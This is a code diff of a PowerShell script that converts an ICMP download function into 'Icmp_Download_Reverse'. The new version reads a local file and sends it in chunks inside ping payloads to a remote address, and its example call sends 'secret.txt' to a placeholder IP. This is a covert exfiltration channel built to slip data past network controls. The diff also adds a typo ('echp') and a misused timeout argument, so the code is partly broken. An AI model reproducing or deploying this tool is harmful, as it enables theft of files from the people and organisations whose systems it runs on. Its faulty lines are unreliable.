@@ -1,4 +1,4 @@
-function Icmp_Download
+function Icmp_Download_Reverse
 {
   [CmdletBinding()] Param(
 
@@ -20,6 +20,7 @@ function Icmp_Download
 
   )
 
+  $SizeFilename = $Filename.Length
   $ICMPClient = New-Object System.Net.NetworkInformation.Ping
   $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
   $PingOptions.DontFragment = $True
@@ -27,39 +28,47 @@ function Icmp_Download
   $ReponseAll = New-Object System.Io.MemoryStream
   $Continue = $true
   $try = 0
+  $bytes = [System.IO.File]::ReadAllBytes($Filename)
   if ([string]::IsNullOrEmpty($FilenameDestination)) {
     $FilenameDestination = $Filename
   }
 
+
   while ($Continue)
   {
+
+    if ($Size -gt ($bytes.Count - $Offset))
+    {
+      $Size = $bytes.Count - $Offset
+    }
+
+    $stringToSend =  $bytes[$Offset..($Offset+$Size-1)]
     $OffsetBytes = [BitConverter]::GetBytes($Offset)
     $SizeBytes = [BitConverter]::GetBytes($Size)[0..1]
-    $sendbytes = ($OffsetBytes + $SizeBytes + [text.encoding]::ASCII.GetBytes($Filename))
-    $reply = $ICMPClient.Send($IPAddress,10000, $sendbytes, $PingOptions)
-    $Reponse = $reply.Buffer
-    if ($Reponse)
+    $FilenameBytes = [BitConverter]::GetBytes($SizeFilename)[0..1]
+    $sendbytes = $FilenameBytes + [text.encoding]::ASCII.GetBytes($FilenameDestination) + $OffsetBytes + $SizeBytes + $stringToSend
+    $reply = $ICMPClient.Send($IPAddress,$Size, $sendbytes, $PingOptions)
+    $Response = $reply.Buffer
+    if ($Response)
     {
       write-host -NoNewline "+"
       $try = 0
-      $ReponseAll.write($Reponse,0,$Reponse.Length)
-      if (-Not($Reponse.Length -eq $Size))
+      $Offset += $Size
+      if ($Offset -eq $bytes.Count)
       {
-        [System.Io.File]::WriteAllBytes($FilenameDestination,$ReponseAll.ToArray())
         $Continue = $false
         echo ""
         echo "Terminated"
-
       }
-      $Offset += $Size
+
     }
     else
     {
       write-host -NoNewline "-"
       $try += 1
-      if ($try > 5)
+      if ($try -gt 5)
       {
-        echo ""
+        echp ""
         echo "Server seems down"
         $Continue = $false
       }
@@ -70,4 +79,4 @@ function Icmp_Download
   }
 }
 
-#Icmp_Download -IPAddress X.X.X.X -Filename secret.txt
+#Icmp_Download_Reverse -IPAddress X.X.X.X -Filename secret.txt
